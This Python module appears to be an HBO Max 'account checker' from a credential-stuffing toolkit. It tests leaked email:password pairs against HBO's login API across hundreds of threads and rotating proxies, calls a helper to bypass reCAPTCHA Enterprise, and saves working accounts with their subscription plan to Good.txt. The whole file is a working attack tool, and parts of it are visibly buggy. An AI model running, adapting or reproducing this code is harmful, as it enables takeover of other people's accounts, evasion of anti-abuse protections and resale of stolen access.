# File: modules/hbo.py

import threading
from pathlib import Path
from random import choices, randint, choice

import Functions.bypass_recaptcha3
from requests import Session
import functools
from requests.adapters import HTTPAdapter, Retry

global bad, custom, good, errors, max_threads
bad = 0
custom = 0
good = 0
errors = 0
max_threads = 200

def set_proxy():
    try:
        proxy = (choice(open("./proxies.txt", "r").readlines()).strip()
                 if len(open("./proxies.txt", "r").readlines()) != 0
                 else None)

        session = Session()

        if proxy:
            if ":" in proxy and len(proxy.split(":")) == 4:
                ip, port, user, pw = proxy.split(":")
                proxy_string = f"http://{user}:{pw}@{ip}:{port}"
            else:
                ip, port = proxy.split(":")
                proxy_string = f"http://{ip}:{port}"

            session.proxies = {
                "http": proxy_string,
                "https": proxy_string
            }
        return session
    except Exception as e:
        print(f"Error setting proxy: {e}")
        return None
def get_guid():
    """Get a guid string"""
    letters = list("abcdefghijklmnopqrstuvwxyz")
    numbers = list("1234567890")
    def get_part(characters:int):
        return "".join(choices(letters+numbers,k=characters))
    return f"{get_part(8)}-{get_part(4)}-{get_part(4)}-{get_part(4)}-{get_part(8)}"
def get_string(characters:int):
    """Get a random string (a-Z 0-9)"""
    chars = list("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")
    return "".join(choices(chars,k=characters))
def get_number(min:int,max:int):
    """Get a number from a range"""
    return randint(min,max)

def check_account(email:str,password:str):
        try:
            with Session() as s:
                print("Setting up session...")
                proxy = set_proxy()
                print("Session set up.")
                proxy_set = set_proxy(proxy)

                s.request = functools.partial(s.request, timeout=10)
                s.proxies.update(proxy_set)
                retries = Retry(total=10, backoff_factor=0.1)
                s.mount('http://', HTTPAdapter(max_retries=retries))
                s.mount('https://', HTTPAdapter(max_retries=retries))
                s.mount('http://', HTTPAdapter(max_retries=retries))
                s.mount('https://', HTTPAdapter(max_retries=retries))

                id1 = get_guid()
                id2 = get_guid()
                id3 = get_guid()
                traceid = f'{id2}-{id3}'

                payload = {"client_id": "24fa5e36-3dc4-4ed0-b3f1-29909271b63d",
                           "client_secret": "24fa5e36-3dc4-4ed0-b3f1-29909271b63d",
                           "scope": "browse video_playback_free account_registration",
                           "grant_type": "client_credentials", "deviceSerialNumber": id1,
                           "clientDeviceData": {"paymentProviderCode": "apple"}}
                headers = {
                    "Accept": "application/vnd.hbo.v9.full+json",
                    "X-B3-TraceId": traceid,
                    "Accept-Language": "en-in",
                    "Accept-Encoding": "gzip, deflate, br",
                    "User-Agent": "HBOMAX CFNetwork/1325.0.1 Darwin/21.1.0",
                    "Connection": "keep-alive",
                    "x-hbo-client-version": "DMX-Web/53.5.0.745099 desktop Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36/N/A",
                    "x-hbo-device-name": "desktop",
                    "x-hbo-device-os-version": "N/A",
                }
                r = s.post('https://oauth.api.hbo.com/auth/tokens', json=payload, headers=headers)
                if 'geo_blocked' in r.text:
                    raise

                refresh_token = r.json()['refresh_token']

                payload = {"grant_type": "refresh_token", "refresh_token": refresh_token,
                           "scope": "browse video_playback_free"}
                headers = {
                    "Accept": "application/vnd.hbo.v9.full+json",
                    "X-B3-TraceId": traceid,
                    "Accept-Language": "en-us",
                    "Accept-Encoding": "gzip, deflate, br",
                    "Content-Type": "application/json",
                    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",
                    "Connection": "keep-alive",
                    "x-hbo-client-version": "DMX-Web/53.5.0.745099 desktop Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36/N/A",
                    "x-hbo-device-name": "desktop",
                    "x-hbo-device-os-version": "N/A",
                }
                r = s.post('https://oauth-us.api.hbo.com/auth/tokens', json=payload, headers=headers)
                if 'geo_blocked' in r.text:
                    raise

                access_token = r.json()['access_token']

                payload = {"contract": "codex:1.1.4.1", "preferredLanguages": ["en-US"]}
                headers = {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
                    "Pragma": "no-cache",
                    "authorization": f"Bearer {access_token}",
                    "x-hbo-client-version": "DMX-Web/53.5.0.745099 desktop Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36/N/A",
                    "x-hbo-device-name": "desktop",
                    "x-hbo-device-os-version": "N/A",
                    "X-B3-TraceId": traceid,
                }
                r = s.post('https://sessions.api.hbo.com/sessions/v1/clientConfig', json=payload, headers=headers)

                globalization = r.json()['payloadValues']['globalization']
                entitlements = r.json()['payloadValues']['entitlements']
                privacy = r.json()['payloadValues']['privacy']
                profile = r.json()['payloadValues']['profile']
                telemetry = r.json()['payloadValues']['telemetry']

                recap_token = Functions.bypass_recaptcha3(
                    'https://www.google.com/recaptcha/enterprise/anchor?ar=1&k=6LeMrv8ZAAAAAIcvo5HKvdj1lxtUdHnS13jUCulQ&co=aHR0cHM6Ly9wbGF5Lmhib21heC5jb206NDQz&hl=en&v=MuIyr8Ej74CrXhJDQy37RPBe&size=invisible&cb=f9q60qxahq1b',
                    'https://www.google.com/recaptcha/enterprise/reload?k=6LeMrv8ZAAAAAIcvo5HKvdj1lxtUdHnS13jUCulQ')

                payload = {"grant_type": "user_name_password",
                           "scope": "browse video_playback device elevated_account_management", "username": email,
                           "password": password}
                headers = {
                    "Host": "oauth-us.api.hbo.com",
                    "x-hbo-client-version": "DMX-Web/53.5.0.745099 desktop Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36/N/A",
                    "x-hbo-device-name": "desktop",
                    "x-hbo-device-os-version": "N/A",
                    "authorization": f"Bearer {access_token}",
                    "Accept": "application/vnd.hbo.v9.full+json",
                    "X-B3-TraceId": traceid,
                    "Accept-Language": "en-us",
                    "Accept-Encoding": "gzip, deflate, br",
                    "Content-Type": "application/json",
                    "User-Agent": "HBOMAX CFNetwork/1325.0.1 Darwin/21.1.0",
                    "Connection": "keep-alive",
                    "x-recaptchatoken": recap_token,
                    "x-hbo-headwaiter": f"entitlements:{entitlements},globalization:{globalization},privacy:{privacy},profile:{profile},telemetry:{telemetry}",
                }
                r = s.post('https://oauth-emea.api.hbo.com/auth/tokens', json=payload, headers=headers)
                if "{\"statusCode\":401" in r.text:
                    bad += 1
                    return
                if "isUserLoggedIn\":true" not in r.text:
                    raise

                token = r.json()['access_token']

                payload = [{"id": "urn:hbo:billing-status:mine"}]
                headers = {
                    "accept": "application/vnd.hbo.v9.full+json",
                    "Accept-Encoding": "gzip",
                    "Accept-Language": "en-us",
                    "authorization": f"Bearer {token}",
                    "Connection": "Keep-Alive",
                    "Content-Type": "application/json",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)",
                    "X-B3-TraceId": traceid,
                    "x-hbo-client-version": "DMX-Web/53.5.0.745099 desktop Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)",
                    "x-hbo-device-name": "desktop",
                    "x-hbo-device-os-version": "N/A",
                    "x-hbo-headwaiter": f"entitlements:{entitlements},globalization:{globalization},privacy:{privacy},profile:{profile},telemetry:{telemetry}",
                    "content-length": "38"
                }
                r = s.post('https://user-comet-emea.api.hbo.com/content', json=payload, headers=headers)
                if 'expired' in r.text:
                    print("Account expired, saving to 'Custom.txt'...")

                    # Check if directories exist, if not, create them
                    dir_path = Path('Checked/HBO')
                    dir_path.mkdir(parents=True, exist_ok=True)

                    # Check if file exists, if not, create it
                    file_path = dir_path / 'Custom.txt'
                    file_path.touch(exist_ok=True)

                    # Save the custom hit to the file
                    with open(file_path, 'a') as file:
                        file.write(f"{email}:{password}\n")
                    print("Account saved to 'Custom.txt'.")
                    custom += 1
                    return

                plan = r.json()[0]['body']['billingInformationMessage'].split('Current Plan: ')[1].split(']')[
                    0].replace('[', '')
                print(f"Account has active plan: {plan}, saving to 'Good.txt'...")
                # Check if directories exist, if not, create them
                dir_path = Path('Checked/HBO')
                dir_path.mkdir(parents=True, exist_ok=True)

                # Check if file exists, if not, create it
                file_path = dir_path / 'Good.txt'
                file_path.touch(exist_ok=True)

                # Save the good hit to the file
                with open(file_path, 'a') as file:
                    file.write(f"{email}:{password} Plan: {plan}\n")
                print("Account saved to 'Good.txt'.")
                good += 1
                return


        except:
            errors += 1

def start_checker(account):
    email, password = account.split(':')
    print(f"Starting checker for account: {email}")
    check_account(email, password)

def start(account_list):
    print("Starting account list checker...")
    for account in account_list:
        print(f"Checking account: {account}")
        while threading.active_count() > max_threads:
            pass
        threading.Thread(target=start_checker, args=(account,)).start()
        print("Finished checking all accounts.")

